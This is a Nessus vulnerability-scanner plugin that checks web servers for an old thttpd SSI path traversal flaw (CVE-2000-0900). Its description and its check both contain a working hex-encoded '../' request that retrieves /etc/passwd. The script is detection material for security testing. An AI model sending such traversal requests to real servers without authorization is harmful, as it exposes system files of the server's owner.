#
# This script was written by Thomas Reinke <reinke@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10523);
 script_bugtraq_id(1737);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0900");
 
 name["english"] = "thttpd ssi file retrieval";
 script_name(english:name["english"]);
 
 desc["english"] = "The remote HTTP server
allows an attacker to read arbitrary files
on the remote web server,  by employing a
weakness in an included ssi package, by
prepending pathnames with %2e%2e/ (hex-
encoded ../) to the pathname.
Example:
    GET /cgi-bin/ssi//%2e%2e/%2e%2e/etc/passwd 

will return /etc/passwd.

Solution: upgrade to version 2.20 of thttpd.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "thttpd ssi flaw";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Thomas Reinke");
 family["english"] = "Remote file access";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
 buf = http_get(item:string(dir, "/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
        port:port);
 rep = http_keepalive_send_recv(port:port, data:buf);
 if( rep == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]", string:rep)){
 	security_hole(port);
	exit(0);
	}
}
